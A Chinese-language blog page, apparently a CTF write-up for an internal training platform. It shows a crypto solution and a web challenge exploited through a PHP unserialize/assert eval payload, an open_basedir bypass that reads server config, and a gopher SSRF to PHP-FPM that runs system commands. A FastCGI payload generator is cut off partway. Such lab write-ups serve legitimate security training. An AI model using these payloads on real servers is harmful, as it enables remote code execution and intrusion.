@@ -1,0 +1,1365 @@
+<!DOCTYPE html>
+<html>
+<head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <!-- 页面元数据 -->
+  
+  <title>EDI内部平台部分题目writeup - 明月归的小站</title>
+  
+    <meta name="keywords" content="writeup">
+  
+
+  
+    <meta name="description" content="EDI内部平台部分题目writeup">
+  
+
+  <!-- feed -->
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  
+    
+<link rel="stylesheet" href="/static/js-css/all.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/static/js-css/font-awesome-animation.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/static/js-css/jquery.fancybox.min.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="/static/js-css/waves.min.css">
+
+  
+
+  
+
+  
+
+  
+
+  <!-- import link -->
+  
+
+  
+  
+    
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+  
+  
+</head>
+
+<body>
+  
+  
+  
+  <div class="cover-wrapper">
+    <cover class='cover post' style="display: none;">
+      <div class='cover-body'>
+  <div class='a'>
+    
+    
+    
+  </div>
+  <div class='b'>
+    <div class='menu navigation dock'>
+      <div class='list-h'>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+      <div class="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+    </cover>
+    <header class="l_header shadow blur">
+  <div class='container'>
+  <div class='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+  </div>
+  
+
+
+  <div class="l_body nocover">
+    <div class='body-wrapper' id="pjax-container">
+      
+        <!--此文件用来存放一些不方便取值的变量--> 
+<!--思路大概是将值藏到重加载的区域内--> 
+ 
+ 
+ 
+<div id="pjax-data" style="display: none"> 
+  <div id="pjax-ispage">true</div> 
+  <div id="pjax-pageTitle">EDI内部平台部分题目writeup</div> 
+  <div id="pjax-enable-cover">true</div> 
+  <div id="pjax-comment-path">none</div> 
+  <div id="pjax-comment-placeholder">none</div> 
+</div> 
+ 
+ 
+<script> 
+  // 处理封面 此时 jquery 还没加载 
+  if ("none" == "none") { // 移除封面 
+    document.getElementsByClassName('cover')[0].style.display = "none"; 
+    document.getElementsByClassName('l_body')[0].classList.add("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.add("show"); 
+  } else { 
+    if ("none" == "blog") { // 半屏 
+      document.getElementsByClassName('cover')[0].classList.remove("full"); 
+      document.getElementsByClassName('cover')[0].classList.add("half"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = "none"; 
+    } else if ("none" == "docs") { // 全屏 
+      document.getElementsByClassName('cover')[0].classList.remove("half"); 
+      document.getElementsByClassName('cover')[0].classList.add("full"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = ""; 
+    } 
+    document.getElementsByClassName('cover')[0].style.display = ""; 
+    document.getElementsByClassName('l_body', 'show')[0].classList.remove("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.remove("show"); 
+  } 
+</script> 
+
+      
+      
+
+<div class='l_main'>
+  
+
+  
+    <article id="post" class="post white-box reveal shadow article-type-post" itemscope itemprop="blogPost">
+      
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h1 class="title">
+    <a href="/2021/01/06/%E5%86%85%E9%83%A8wp/edi/">
+      EDI内部平台部分题目writeup
+    </a>
+  </h1>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="/pic/youxiang.jpg">
+    <p>MoonBack</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2021年1月6日</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+  <div class="new-meta-item wordcount">
+    <a class='notlink'>
+      <i class="fas fa-keyboard fa-fw" aria-hidden="true"></i>
+      <p>字数：6.3k字</p>
+    </a>
+  </div>
+  <div class="new-meta-item readtime">
+    <a class='notlink'>
+      <i class="fas fa-hourglass-half fa-fw" aria-hidden="true"></i>
+      <p>时长：37分钟</p>
+    </a>
+  </div>
+
+
+            
+          
+            
+              
+  <div class="new-meta-item browse valine">
+    <a class='notlink'>
+      <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+      
+      <span id="/2021/01/06/%E5%86%85%E9%83%A8wp/edi/" class="leancloud_visitors" data-flag-title="EDI内部平台部分题目writeup">
+      <p>
+        <span class="leancloud-visitors-count"></span>
+      </p>
+      </span>
+    </a>
+  </div>
+
+
+            
+          
+            
+              
+<div class="new-meta-item comments-count">
+  
+  <a href="/2021/01/06/%E5%86%85%E9%83%A8wp/edi/#comments">
+    <i class="fas fa-comment-dots fa-fw"></i>
+    <span class="valine-comment-count" data-xid="/2021/01/06/%E5%86%85%E9%83%A8wp/edi/">0</span>
+    <span class="leancloud-comments-count">&nbsp;</span>
+  </a>
+</div>
+
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+      <section class="article typo">
+        <div class="article-entry" itemprop="articleBody">
+          
+          
+          <p>EDI内部平台部分题目writeup</p>
+<a id="more"></a>
+
+<h3 id="easycry"><a href="#easycry" class="headerlink" title="easycry"></a>easycry</h3><p>题目：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from gmpy2 import next_prime</span><br><span class="line">from random import getrandbits</span><br><span class="line">from libnum import n2s,s2n</span><br><span class="line">from secret import flag</span><br><span class="line"></span><br><span class="line">assert len(flag) &#x3D;&#x3D; 36</span><br><span class="line">m, p, q &#x3D; next_prime(s2n(flag)),next_prime(getrandbits(0x120)),next_prime(getrandbits(0x200))</span><br><span class="line">s &#x3D; m * p % q</span><br><span class="line"></span><br><span class="line">print hex(p)</span><br><span class="line">print hex(q)</span><br><span class="line">print hex(s)</span><br><span class="line"></span><br><span class="line"># 0x9dfe6f4722f783589a955fe381d0308541dc2af910f525008b6265a294eff48846343c59</span><br><span class="line"># 0xbf80113b43da6b0ad6bf32ba38ead7c936b97c775d3e728dc50d33a21d5e296cdab74b7911afdd07a662dbe600ce926902974f62c2dc146e292f6209b96a5fbf</span><br><span class="line"># 0x574c8185aca3caa5d3f3f40a534a8d9604cd3de6b2e6372c0131a843f34d2e245a328c1b6a69b5d65430d18d0fab941ebd93414f59be0a44b35daf3b4a1e8acc</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import libnum</span><br><span class="line"></span><br><span class="line">p &#x3D; 0x9dfe6f4722f783589a955fe381d0308541dc2af910f525008b6265a294eff48846343c59</span><br><span class="line">q &#x3D; 0xbf80113b43da6b0ad6bf32ba38ead7c936b97c775d3e728dc50d33a21d5e296cdab74b7911afdd07a662dbe600ce926902974f62c2dc146e292f6209b96a5fbf</span><br><span class="line">s &#x3D; 0x574c8185aca3caa5d3f3f40a534a8d9604cd3de6b2e6372c0131a843f34d2e245a328c1b6a69b5d65430d18d0fab941ebd93414f59be0a44b35daf3b4a1e8acc</span><br><span class="line"></span><br><span class="line">flag &#x3D; hex(s*pow(p,q-2,q)%q)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="yyds"><a href="#yyds" class="headerlink" title="yyds"></a>yyds</h3><p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">unserialize($_REQUEST[<span class="string">&#x27;func&#x27;</span>])($_REQUEST[<span class="string">&#x27;args&#x27;</span>]); </span><br></pre></td></tr></table></figure>
+
+<p>assert可用  payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?func&#x3D;s:6:&quot;assert&quot;;&amp;args&#x3D;eval($_POST[1])</span><br></pre></td></tr></table></figure>
+
+<p>disable_functions</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stream_socket_client,fsockopen,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑连上 几个bypass_disable_function都不能绕</p>
+<p>open_basedir可以绕 可读文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">&#x27;/tmp/css&#x27;</span>);chdir(<span class="string">&#x27;/tmp/css&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);print_r(scandir(<span class="string">&#x27;/etc/nginx/sites-available/default&#x27;</span>));print_r(file_get_contents(<span class="string">&#x27;/etc/nginx/sites-available/default&#x27;</span>));</span><br></pre></td></tr></table></figure>
+
+<p>看到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcgi_pass 127.0.0.1:39001; </span><br></pre></td></tr></table></figure>
+
+<p>应该是打fastcgi没跑了 有curl扩展</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_content</span>(<span class="params">$url</span>)</span>&#123;</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="literal">false</span>); </span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="number">0</span>); </span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_DNS_USE_GLOBAL_CACHE, <span class="literal">false</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">5</span>);</span><br><span class="line">    $output = curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">    <span class="keyword">return</span> $output;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> get_content(<span class="string">&#x27;gopher://127.0.0.1:39001/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH54%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%006%04%00%3C%3Fphp%20system%28%27id%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>gopher那串可以用下面脚本生成</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> six.moves.urllib <span class="keyword">import</span> parse <span class="keyword">as</span> urlparse</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span></span><br><span class="line"></span><br><span class="line">PY2 = <span class="literal">True</span> <span class="keyword">if</span> sys.version_info.major == <span class="number">2</span> <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bchr</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">if</span> PY2:</span><br><span class="line">        <span class="keyword">return</span> force_bytes(chr(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> bytes([i])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bord</span>(<span class="params">c</span>):</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(c, int):</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> ord(c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_bytes</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> s.encode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_text</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">if</span> issubclass(type(s), str):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        s = str(s, <span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = str(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FastCGIClient</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># private</span></span><br><span class="line">    __FCGI_VERSION = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    __FCGI_ROLE_RESPONDER = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_AUTHORIZER = <span class="number">2</span></span><br><span class="line">    __FCGI_ROLE_FILTER = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    __FCGI_TYPE_BEGIN = <span class="number">1</span></span><br><span class="line">    __FCGI_TYPE_ABORT = <span class="number">2</span></span><br><span class="line">    __FCGI_TYPE_END = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_PARAMS = <span class="number">4</span></span><br><span class="line">    __FCGI_TYPE_STDIN = <span class="number">5</span></span><br><span class="line">    __FCGI_TYPE_STDOUT = <span class="number">6</span></span><br><span class="line">    __FCGI_TYPE_STDERR = <span class="number">7</span></span><br><span class="line">    __FCGI_TYPE_DATA = <span class="number">8</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES = <span class="number">9</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES_RESULT = <span class="number">10</span></span><br><span class="line">    __FCGI_TYPE_UNKOWNTYPE = <span class="number">11</span></span><br><span class="line"></span><br><span class="line">    __FCGI_HEADER_SIZE = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># request state</span></span><br><span class="line">    FCGI_STATE_SEND = <span class="number">1</span></span><br><span class="line">    FCGI_STATE_ERROR = <span class="number">2</span></span><br><span class="line">    FCGI_STATE_SUCCESS = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, host, port, timeout, keepalive</span>):</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.timeout = timeout</span><br><span class="line">        <span class="keyword">if</span> keepalive:</span><br><span class="line">            self.keepalive = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.keepalive = <span class="number">0</span></span><br><span class="line">        self.sock = <span class="literal">None</span></span><br><span class="line">        self.requests = dict()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__connect</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span></span><br><span class="line">        <span class="comment"># self.sock.settimeout(self.timeout)</span></span><br><span class="line">        <span class="comment"># self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span></span><br><span class="line">        <span class="comment"># # if self.keepalive:</span></span><br><span class="line">        <span class="comment"># #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span></span><br><span class="line">        <span class="comment"># # else:</span></span><br><span class="line">        <span class="comment"># #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span></span><br><span class="line">        <span class="comment"># try:</span></span><br><span class="line">        <span class="comment">#     self.sock.connect((self.host, int(self.port)))</span></span><br><span class="line">        <span class="comment"># except socket.error as msg:</span></span><br><span class="line">        <span class="comment">#     self.sock.close()</span></span><br><span class="line">        <span class="comment">#     self.sock = None</span></span><br><span class="line">        <span class="comment">#     print(repr(msg))</span></span><br><span class="line">            <span class="comment"># return False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeFastCGIRecord</span>(<span class="params">self, fcgi_type, content, requestid</span>):</span></span><br><span class="line">        length = len(content)</span><br><span class="line">        buf = bchr(FastCGIClient.__FCGI_VERSION) \</span><br><span class="line">               + bchr(fcgi_type) \</span><br><span class="line">               + bchr((requestid &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(requestid &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr((length &gt;&gt; <span class="number">8</span>) &amp; <span 